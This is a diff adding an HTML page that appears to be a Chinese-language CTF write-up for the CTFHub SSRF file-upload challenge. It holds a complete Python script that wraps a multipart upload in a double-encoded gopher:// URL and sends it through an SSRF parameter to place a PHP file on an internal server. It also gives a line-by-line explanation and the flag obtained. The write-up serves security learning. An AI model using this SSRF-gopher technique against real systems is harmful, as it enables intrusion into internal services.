@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-SSRF上传文件 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-SSRF上传文件 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, SSRF, 上传文件, Gopher协议, multipart/form-data, Python脚本</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - SSRF / 上传文件</li>
+        <li><strong>题目名称：</strong>上传文件</li>
+        <li><strong>环境：</strong>VS Code + Python 环境。</li>
+        <li><strong>目标：</strong>利用 SSRF 漏洞，通过 Gopher 协议构造 <code>multipart/form-data</code> 格式的 POST 请求，向内网 <code>flag.php</code> 上传 Webshell 文件，获取 Flag。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>本关核心考点：</strong>利用 <strong>Gopher 协议</strong>发送 <strong>multipart/form-data</strong> 格式的文件上传 POST 请求。</p >
+    
+    <div class="diff-box">
+        <strong>知识点拆解：</strong>
+        <ul>
+            <li><strong>multipart/form-data 格式：</strong>HTTP 协议中用于文件上传的编码方式。它需要一个 boundary（边界字符串）来分隔表单的各个字段。报文头需要声明 <code>Content-Disposition</code> 和 <code>filename</code>，且换行符要求极其严格（必须是 <code>\r\n</code>）。</li>
+            <li><strong>双重 URL 编码：</strong>Gopher 协议的数据包会被中间件解码一次，如果只编码一次，特殊字符（如 <code>:</code>, <code>/</code>, <code>_</code>）会导致 URL 参数截断。因此必须对 HTTP 报文进行一次编码后，再对整个 Gopher URL 进行第二次编码。</li>
+            <li><strong>Content-Length 动态计算：</strong>必须精确计算 POST Body 的字节长度，否则 HTTP 服务器会截断请求体，导致上传失败（400 Bad Request 或请求被丢弃）。</li>
+        </ul>
+    </div>
+
+    <h2>3. 详细步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：获取源码信息，确认上传格式</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 在浏览器访问 <code>?url=http://127.0.0.1/flag.php</code>，右键查看页面源代码。</p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>发现表单代码：<code>&lt;form action="/flag.php" method="post" enctype="multipart/form-data"&gt;&lt;input type="file" name="file"&gt;&lt;/form&gt;</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确认请求方式为 POST，编码类型为 <code>multipart/form-data</code>，表单字段名为 <code>file</code>。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：编写 Python 脚本构造上传 Payload</h3>
+        <div class="payload-box">
+            <p><strong>脚本代码：</strong></p>
+            <pre><code>import requests
+import urllib.parse
+import re
+
+# 1. 靶场根地址（注意末尾不要有斜杠）
+base_url = "http://challenge-ad5f8faf3352964a.sandbox.ctfhub.com:10800"
+
+# 2. 定义 boundary（边界字符串，用于分隔表单字段）
+boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+
+# 3. 构造要上传的文件内容（Webshell）
+file_content = "<?php echo 'test'; ?>"
+
+# 4. 构造 multipart/form-data 格式的 POST Body
+# 注意：HTTP协议严格规定，每一行末尾必须是 \r\n
+post_body = (
+    f"--{boundary}\r\n"
+    f'Content-Disposition: form-data; name="file"; filename="test.php"\r\n'
+    "Content-Type: text/plain\r\n"
+    "\r\n"
+    f"{file_content}\r\n"
+    f"--{boundary}--\r\n"
+)
+
+# 5. 构造完整的原始 HTTP POST 报文
+raw_request = (
+    "POST /flag.php HTTP/1.1\r\n"
+    "Host: 127.0.0.1\r\n"
+    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
+    f"Content-Length: {len(post_body)}\r\n"
+    "Connection: close\r\n"
+    "\r\n"
+    f"{post_body}"
+)
+
+# 6. 第一次 URL 编码（Python的 quote 会自动将 \r\n 转义为 %0D%0A，绝不能手动 replace）
+encoded_http = urllib.parse.quote(raw_request)
+
+# 7. 拼接 Gopher 协议
+gopher_payload = f"gopher://127.0.0.1:80/_{encoded_http}"
+
+# 8. 对整个 Gopher URL 进行第二次 URL 编码（关键，防止参数截断）
+final_payload = urllib.parse.quote(gopher_payload)
+
+# 9. 发送请求，直接拼接 URL（避开 requests 库自动编码干扰）
+attack_url = f"{base_url}/?url={final_payload}"
+print("[*] 正在向靶场发送 Webshell 上传攻击请求...")
+
+try:
+    r = requests.get(attack_url, timeout=10)
+    # 10. 精准提取 Flag
+    match = re.search(r'ctfhub\{[a-f0-9]+\}', r.text)
+    if match:
+        print("\n[+] 成功获取 Flag！")
+        print(f"[+] {match.group(0)}")
+    else:
+        print("[-] 未提取到 Flag，原始回显如下：")
+        print(r.text[:500])
+except Exception as e:
+    print("[-] 请求出现异常：", e)</code></pre>
+        </div>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>import requests, urllib.parse, re</code>：导入网络请求模块、URL 编码模块和正则表达式模块。</li>
+            <li><code>base_url = "..."</code>：靶场的根地址，脚本会自动拼接 <code>?url=</code> 参数。</li>
+            <li><code>boundary = "..."</code>：定义 multipart 表单的边界分隔符，格式任意，不冲突即可。</li>
+            <li><code>post_body = (...)</code>：严格按照 multipart 协议拼装 Body。开头和结尾必须包含 <code>--{boundary}</code>。中间包含 <code>Content-Disposition: form-data; name="file"; filename="test.php"</code>，声明表单字段名为 <code>file</code>，文件名为 <code>test.php</code>。<strong>所有换行符必须为 <code>\r\n</code>，绝不能省略或使用 <code>\n</code></strong>。</li>
+            <li><code>raw_request = (...)</code>：构造原始 HTTP 报文。包含请求行、Host、Content-Type（此处需显式声明 <code>boundary</code>）、Content-Length（使用 <code>len(post_body)</code> 动态计算，确保长度准确无误）、Connection: close。</li>
+            <li><code>urllib.parse.quote(raw_request)</code>：<strong>第一次 URL 编码</strong>。将 HTTP 报文中的特殊字符（如空格转 <code>%20</code>，<code>\r\n</code> 转 <code>%0D%0A</code>）进行 URL 编码。Python 的 <code>quote</code> 会自动处理换行符，<strong>绝对禁止手动 replace</strong>，否则会破坏换行结构导致 400 错误。</li>
+            <li><code>gopher_payload = f"gopher://127.0.0.1:80/_{encoded_http}"</code>：拼接 Gopher 协议头。Gopher 协议通过 <code>_</code> 后面拼接经过编码的 TCP 数据流。</li>
+            <li><code>urllib.parse.quote(gopher_payload)</code>：<strong>第二次 URL 编码</strong>。因为 Gopher URL 是作为 <code>?url=</code> 参数的值进行传递的，如果直接发送，其中的 <code>:</code>、<code>/</code>、<code>_</code> 等特殊字符会被服务器或浏览器截断，导致请求失败。对整个 URL 再次编码，能确保 Payload 完整送达。</li>
+            <li><code>requests.get(attack_url)</code>：直接拼接 URL 发送请求。</li>
+            <li><code>re.search(r'ctfhub\{[a-f0-9]+\}', r.text)</code>：用正则表达式从 HTML 响应中精准提取纯净的 Flag 字符串，避免复制到无关的 HTML 标签。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：执行脚本获取 Flag</h3>
+        <div class="payload-box">
+            <p><strong>执行操作：</strong>在 VS Code 终端中运行脚本。</p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>终端打印出 <code>[+] ctfhub{efe9be349dc8f7620f391e96}</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>Gopher 协议上传文件成功，提交 Flag 通关。</p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：手动 replace 导致 400 Bad Request。</strong> 在第一次 <code>urllib.parse.quote()</code> 编码后，尝试手动执行 <code>encoded_http.replace("%0A", "%0D%0A")</code>。由于 <code>quote</code> 已经自动将 <code>\r\n</code> 编码为 <code>%0D%0A</code>，再次替换会将其破坏为 <code>%0D%0D%0A</code>。畸形的换行符导致 HTTP 报文分界失效，Apache 服务器直接返回 400 Bad Request。正确的做法是信任 Python 的 <code>quote</code> 函数，绝不多此一举。</li>
+        <li><strong>坑2：Content-Length 未动态计算。</strong> 在 multipart 格式中，Body 长度必须通过 <code>len(post_body)</code> 精确计算。如果写死长度，服务器会认为请求体被截断，导致上传的数据不完整，验证失败。</li>
+        <li><strong>坑3：双重 URL 编码的必要性。</strong> 如果只对 HTTP 报文编码，Gopher URL 中的冒号和斜杠会被 <code>?url=</code> 截断，导致 SSRF 请求无法正确转发到内网。必须对整个 Gopher 字符串进行二次编码。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>Gopher 协议构造文件上传的通用模板：</strong> 构造 multipart/form-data Body -> 拼装 HTTP 报文 -> 第一次 URL 编码 -> 拼接 Gopher URL -> 第二次 URL 编码。</li>
+        <li><strong>Python 编码处理原则：</strong> <code>urllib.parse.quote()</code> 自动处理 <code>\r\n</code> 转 <code>%0D%0A</code>、空格转 <code>%20</code>，写脚本时不要画蛇添足手动替换。</li>
+        <li><strong>脚本编写规范：</strong> 使用正则提取 Flag、动态计算 Content-Length、双重编码，是 SSRF Gopher 攻击的标准化脚本写法。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
